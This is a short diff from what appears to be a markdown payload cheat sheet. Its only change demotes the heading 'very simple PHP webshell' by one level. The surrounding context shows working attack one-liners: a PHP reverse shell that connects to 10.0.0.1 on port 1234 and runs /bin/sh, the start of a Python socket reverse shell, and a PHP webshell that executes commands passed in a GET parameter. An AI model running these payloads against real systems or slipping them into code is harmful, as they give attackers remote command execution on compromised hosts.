@@ -374,7 +374,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
-## very simple PHP webshell
+### very simple PHP webshell
 ```
 <?php system($_GET["cmd"]);?>
 ```
